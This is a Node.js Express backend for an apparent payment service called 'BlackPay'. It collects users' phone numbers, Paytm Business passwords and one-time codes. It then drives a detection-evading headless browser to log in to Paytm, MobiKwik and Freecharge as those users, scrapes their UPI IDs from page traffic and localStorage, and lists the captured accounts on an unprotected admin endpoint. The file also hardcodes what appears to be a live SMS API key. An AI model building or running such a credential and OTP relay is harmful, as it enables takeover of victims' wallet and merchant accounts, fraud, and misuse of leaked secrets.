const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');

// ANTI-CAPTCHA STEALTH MODE
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());

// 🔴 FAST2SMS API KEY 🔴
const FAST2SMS_API_KEY = "dl51mufyW8oVtTEzHYnKXIUjx6GSMFDCR93JBObN40saehLqkvG5HnUSwa6mIzVDYso8p7AWhEQJNXPc";

// 🏦 MERCHANT BANK CONFIG 🏦
const MERCHANT_BANK = {
    accountNumber: "123456789012",
    ifsc: "SBIN0001234",
    beneficiaryName: "BlackPay Merchant",
    bankName: "State Bank of India"
};

const activeSessions = new Map();
const linkedAccounts = []; // 🚀 DASHBOARD KE LIYE DATA YAHAN SAVE HOGA
let globalBrowser = null; 
let browserStartupError = null;

// ============================================================================
// 🚀 INITIALIZE GLOBAL BROWSER ON SERVER START
// ============================================================================
(async () => {
    console.log("[⏳] Initializing Ultra-Fast Global Browser...");
    try {
        let chromePath = null;
        if (fs.existsSync("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe")) {
            chromePath = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
        } else if (fs.existsSync("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe")) {
            chromePath = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
        }

        globalBrowser = await puppeteer.launch({
            headless: false, // Production (VPS) par isko 'true' kar dena
            executablePath: chromePath || undefined,
            args: [
                '--no-sandbox', 
                '--disable-setuid-sandbox', 
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--disable-blink-features=AutomationControlled',
                '--window-size=1920,1080'
            ]
        });
        console.log("[✅] Global Browser Ready! Waiting for Requests...");
    } catch (error) {
        browserStartupError = error;
        console.error("[❌] Global Browser failed to start:", error.message);
    }
})();

app.get('/', (req, res) => res.json({ success: true, message: "BlackPay Ultra-Fast Server is Live!" }));
app.get('/api/get-payment-details', (req, res) => res.json({ success: true, data: MERCHANT_BANK }));

// ============================================================================
// 🚀 ADMIN DASHBOARD API (Naya Route)
// ============================================================================
app.get('/api/admin/live-upis', (req, res) => {
    res.json({ success: true, data: linkedAccounts });
});

// ============================================================================
// 0. API: APP LOGIN & REGISTER OTP (FAST2SMS)
// ============================================================================
app.post('/api/auth/send-otp', async (req, res) => {
    const { phone, generatedOtp } = req.body;
    if (!phone || !generatedOtp) return res.status(400).json({ success: false, message: "Phone or OTP missing." });

    try {
        const url = `https://www.fast2sms.com/dev/bulkV2?authorization=${FAST2SMS_API_KEY}&route=q&message=Your%20BlackPay%20OTP%20is%20${generatedOtp}&language=english&flash=0&numbers=${phone}`;
        const response = await axios.get(url, { timeout: 8000 });
        if (response.data.return === true) {
            res.json({ success: true, message: "OTP Sent successfully!" });
        } else {
            res.status(400).json({ success: false, message: response.data.message[0] || "Fast2SMS Error" });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: "Server SMS Error" });
    }
});

// ============================================================================
// 1. API: SEND OTP TO WALLET (SUPER FAST)
// ============================================================================
app.post('/api/wallet/send-otp', async (req, res) => {
    const phone = req.body.number || req.body.phone;
    const { password, walletType } = req.body; 
    
    if (!phone || phone.length !== 10) return res.status(400).json({ success: false, message: "Invalid 10 digit number!" });
    if (browserStartupError) return res.status(503).json({ success: false, message: "Browser service unavailable." });
    if (!globalBrowser) return res.status(500).json({ success: false, message: "Server browser initializing..." });

    let walletName = walletType ? walletType.toLowerCase().trim() : "freecharge";

    // Clean old session
    if (activeSessions.has(phone)) {
        try { await activeSessions.get(phone).context.close(); } catch(e) {}
        activeSessions.delete(phone);
    }

    let context, page;
    try {
        context = await globalBrowser.createBrowserContext();
        page = await context.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

        await page.setRequestInterception(true);
        page.on('request', (req) => {
            const blockedTypes = ['image', 'stylesheet', 'font', 'media'];
            if (blockedTypes.includes(req.resourceType())) req.abort();
            else req.continue();
        });
        
        // 🚀 PAYTM BUSINESS LOGIC
        if (walletName.includes('paytm')) {
            if (!password) {
                await context.close();
                return res.status(400).json({ success: false, message: "Paytm Business requires a password!" });
            }

            try { await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'domcontentloaded', timeout: 25000 }); } 
            catch (e) { await context.close(); return res.status(400).json({ success: false, message: "Paytm server slow. Try again." }); }
            
            let inputField = null;
            for (let attempt = 0; attempt < 50; attempt++) {
                let frames = []; try { frames = page.frames(); } catch(e) { frames = [page]; }
                for (let frame of frames) {
                    try {
                        let inputs = await frame.$$('input:not([type="password"]):not([type="hidden"])');
                        for (let el of inputs) {
                            let box = await el.boundingBox();
                            if (box && box.width > 0 && box.height > 0) { inputField = el; break; }
                        }
                    } catch (e) {}
                    if (inputField) break;
                }
                if (inputField) break;
                await new Promise(r => setTimeout(r, 100)); 
            }

            if (!inputField) {
                await context.close();
                return res.status(400).json({ success: false, message: "Paytm page load failed." });
            }

            await inputField.focus(); await inputField.click({ clickCount: 3 }); await inputField.press('Backspace');       
            await inputField.type(phone, { delay: 0 });

            // Type Password
            let passField = null; 
            for (let attempt = 0; attempt < 30; attempt++) {
                let frames = []; try { frames = page.frames(); } catch(e) { frames = [page]; }
                for (let frame of frames) {
                    try {
                        let fields = await frame.$$('input[type="password"]');
                        for (let el of fields) {
                            let box = await el.boundingBox();
                            if (box && box.width > 0 && box.height > 0) { passField = el; break; }
                        }
                    } catch (e) {}
                    if (passField) break;
                }
                if (passField) break;
                await new Promise(r => setTimeout(r, 100));
            }
            
            if (passField) {
                await passField.focus(); await passField.click({ clickCount: 3 }); await passField.press('Backspace');
                await passField.type(password, { delay: 0 });
            }
            await page.keyboard.press('Enter');
        }
        // 🚀 MOBIKWIK LOGIC
        else if (walletName.includes('mobikwik')) {
            await page.goto('https://www.mobikwik.com/login', { waitUntil: 'domcontentloaded', timeout: 20000 });
            
            let inputField = null;
            for (let attempt = 0; attempt < 50; attempt++) {
                try {
                    let inputs = await page.$$('input:not([type="hidden"])');
                    for (let el of inputs) {
                        let box = await el.boundingBox();
                        if (box && box.width > 0 && box.height > 0) { inputField = el; break; }
                    }
                } catch(e) {}
                if (inputField) break;
                await new Promise(r => setTimeout(r, 100));
            }

            if (inputField) {
                await inputField.focus(); 
                await inputField.click({ clickCount: 3 }); 
                await inputField.press('Backspace');
                await inputField.type(phone, { delay: 10 }); // 10ms delay taaki number adhura na rahe
            } else {
                await new Promise(r => setTimeout(r, 1000));
                await page.keyboard.type(phone, { delay: 10 });
            }
            await page.keyboard.press('Enter');
        }
        // 🚀 FREECHARGE LOGIC
        else if (walletName.includes('freecharge')) {
            await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded', timeout: 20000 });
            
            let inputField = null;
            for (let attempt = 0; attempt < 50; attempt++) {
                try {
                    let inputs = await page.$$('input:not([type="hidden"])');
                    for (let el of inputs) {
                        let box = await el.boundingBox();
                        if (box && box.width > 0 && box.height > 0) { inputField = el; break; }
                    }
                } catch(e) {}
                if (inputField) break;
                await new Promise(r => setTimeout(r, 100));
            }

            if (inputField) {
                await inputField.focus(); 
                await inputField.click({ clickCount: 3 }); 
                await inputField.press('Backspace');
                await inputField.type(phone, { delay: 10 }); // 10ms delay
            } else {
                await new Promise(r => setTimeout(r, 1000));
                await page.keyboard.type(phone, { delay: 10 });
            }
            await page.keyboard.press('Enter');
        }
        // 🚀 FREECHARGE LOGIC
        else if (walletName.includes('freecharge')) {
            await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded', timeout: 20000 });
            await new Promise(r => setTimeout(r, 1000));
            await page.keyboard.type(phone, { delay: 0 });
            await page.keyboard.press('Enter');
        }

        activeSessions.set(phone, { context, page, walletType: walletName });

        setTimeout(async () => {
            if (activeSessions.has(phone)) {
                try { await context.close(); } catch(e) {}
                activeSessions.delete(phone);
                console.log(`[!] Auto-closed context for ${phone}`);
            }
        }, 120000); 
        
        res.json({ success: true, message: `OTP request sent for ${phone}` });
    } catch (error) { 
        if (context) try { await context.close(); } catch(e){}
        activeSessions.delete(phone);
        res.status(500).json({ success: false, message: "Error: " + error.message }); 
    }
});

// ============================================================================
// 2. API: STRICT OTP VERIFICATION & SMART UPI EXTRACTION
// ============================================================================
app.post('/api/wallet/verify-otp', async (req, res) => {
    const phone = req.body.number || req.body.phone;
    const { otp } = req.body; 
    
    if (!phone || !otp) return res.status(400).json({ success: false, message: "Phone or OTP missing." });
    if (!activeSessions.has(phone)) return res.status(400).json({ success: false, message: "Session expired. Request OTP again." });

    const session = activeSessions.get(phone);
    const { context, page, walletType: currentWallet } = session;

    try {
        console.log(`[+] Injecting OTP for ${phone}: ${otp}`);
        let frames = []; try { frames = [page, ...page.frames()]; } catch(e) { frames = [page]; }
        let otpTyped = false; 

        // 🚀 SMART API RESOLVER WITH STRICT OTP VALIDATION
        let otpApiPromise = new Promise((resolve) => {
            let isResolved = false;
            
            const handler = async (response) => {
                if (isResolved) return;
                try {
                    const req = response.request(); if (req.method() === 'OPTIONS') return;
                    const url = response.url().toLowerCase(); const type = req.resourceType();
                    
                    if (type === 'xhr' || type === 'fetch') {
                        const text = await response.text();
                        if (url.includes('verify') || url.includes('login') || url.includes('auth') || url.includes('otp')) {
                            const textLower = text.toLowerCase();
                            // STRICT REJECTION
                            if (response.status() >= 400 || textLower.includes('"success":false') || textLower.includes('invalid otp') || textLower.includes('incorrect') || textLower.includes('wrong')) { 
                                isResolved = true; resolve(false); 
                            } else if (textLower.includes('token') || textLower.includes('success":true')) {
                                isResolved = true; resolve(true);
                            }
                        }
                    }
                } catch(e) {} 
            };
            page.on('response', handler);

            // STRICT FALLBACK (Check DOM for Error messages after 5 seconds)
            setTimeout(async () => { 
                if (!isResolved) { 
                    try {
                        const hasError = await page.evaluate(() => {
                            const body = document.body.innerText.toLowerCase();
                            return body.includes('incorrect otp') || body.includes('invalid otp') || body.includes('wrong otp');
                        });
                        isResolved = true; 
                        resolve(!hasError); 
                    } catch(e) {
                        isResolved = true; resolve(false);
                    }
                } 
            }, 5000);
        });

        // Type the OTP fast
        for (let attempt = 0; attempt < 30; attempt++) {
            for (let frame of frames) {
                try {
                    let inputs = await frame.$$('input:not([type="hidden"])');
                    for (let el of inputs) {
                        let box = await el.boundingBox();
                        if (box && box.width > 0 && box.height > 0) {
                            await el.focus(); await el.click({ clickCount: 3 }); await el.press('Backspace');
                            await el.type(otp, { delay: 0 }); // SUPER FAST TYPING
                            await frame.evaluate((inp) => { try { inp.blur(); } catch(err) {} }, el);
                            otpTyped = true; break;
                        }
                    }
                } catch (e) {}
                if (otpTyped) break;
            }
            if (otpTyped) break;
            await new Promise(r => setTimeout(r, 100));
        }

        if (!otpTyped) { try { await page.keyboard.type(otp, { delay: 0 }); } catch(e){} }
        
        await page.keyboard.press('Enter');
        try {
            await page.evaluate(() => {
                let btns = Array.from(document.querySelectorAll('button'));
                let target = btns.find(b => b.innerText.toLowerCase().includes('submit') || b.innerText.toLowerCase().includes('verify'));
                if (target) target.click();
            });
        } catch(e) {}

        const isOtpSuccess = await otpApiPromise;

        if (!isOtpSuccess) { 
            return res.status(400).json({ success: false, message: "Invalid OTP! Please enter correct OTP." }); 
        }

        // ====================================================================
        // 🚀 UPI EXTRACTION (PAYTM MERCHANT, MOBIKWIK, FREECHARGE, PHONEPE)
        // ====================================================================
        let currentUrl = ""; try { currentUrl = page.url() || ""; } catch(e) { currentUrl = currentWallet; }
        let finalUpi = "";

        await new Promise(r => setTimeout(r, 3000));

        // 🚀 PAYTM MERCHANT EXTRACTION
        if (currentUrl.includes('paytm') || currentWallet.includes('paytm')) {
            console.log(`[+] Smart Mode ON: Hunting for @pty Merchant UPI via Network Traffic...`);
            
            page.on('response', async (response) => {
                try {
                    const url = response.url().toLowerCase();
                    if (url.includes('profile') || url.includes('merchant') || url.includes('qr') || url.includes('v1/api')) {
                        const text = await response.text();
                        const match = text.match(/[a-zA-Z0-9.\-_]+@(pty|paytmpty)/i);
                        if (match && !finalUpi) {
                            finalUpi = match[0];
                            console.log(`[🔥] BINGO! API Traffic se direct mili: ${finalUpi}`);
                        }
                    }
                } catch(e) {}
            });

            try { 
                await page.goto('https://dashboard.paytm.com/next/profile', { waitUntil: 'networkidle2', timeout: 15000 }); 
            } catch(e) {}

            for (let i = 0; i < 15; i++) {
                if (finalUpi && finalUpi.includes('@pty')) break; 

                try {
                    let scrapedUpi = await page.evaluate(() => {
                        const regex = /[a-zA-Z0-9.\-_]+@(pty|paytmpty)/i;
                        for (let j = 0; j < localStorage.length; j++) {
                            let val = localStorage.getItem(localStorage.key(j));
                            if (val && typeof val === 'string') {
                                let match = val.match(regex);
                                if (match) return match[0];
                            }
                        }
                        let htmlString = document.documentElement.innerHTML;
                        let match2 = htmlString.match(regex);
                        if (match2) return match2[0];
                        return "";
                    });
                    if (scrapedUpi) { finalUpi = scrapedUpi; }
                } catch(e) {}
                await new Promise(r => setTimeout(r, 1000));
            }
        } 
        else if (currentUrl.includes('mobikwik') || currentWallet.includes('mobikwik')) { 
            finalUpi = `${phone}@ikwik`;
        } 
        else if (currentWallet.includes('freecharge')) {
            finalUpi = `${phone}@freecharge`;
        }
        else if (currentWallet.includes('phonepe')) { 
            finalUpi = `${phone}@ybl`; 
        }

        if (!finalUpi || !finalUpi.includes("@") || finalUpi.trim() === "") {
            try { await context.close(); } catch(e) {}
            activeSessions.delete(phone);
            return res.status(400).json({ 
                success: false, 
                message: "Wallet linking failed. Merchant UPI ID (@pty) could not be verified." 
            });
        }

        // 🚀 DATA PUSH: DASHBOARD KE LIYE DATA SAVE KARO
        linkedAccounts.push({
            phone: phone,
            walletType: currentWallet.toUpperCase(),
            upiId: finalUpi,
            time: new Date().toLocaleTimeString()
        });

        // Cleanup & Success
        try { await context.close(); } catch(e) {}
        activeSessions.delete(phone);

        console.log(`[+] Success! Account Bound. Assigned UPI ID: ${finalUpi}`);
        res.json({ success: true, message: "Account Successfully Linked!", upiId: finalUpi, upi_id: finalUpi, mobile: phone });

    } catch (error) { 
        try { await context.close(); } catch(e) {}
        activeSessions.delete(phone);
        res.status(500).json({ success: false, message: "Error: " + error.message }); 
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => { 
    console.log(`🚀 BlackPay Ultra-Fast Server running on port ${PORT}`); 
});
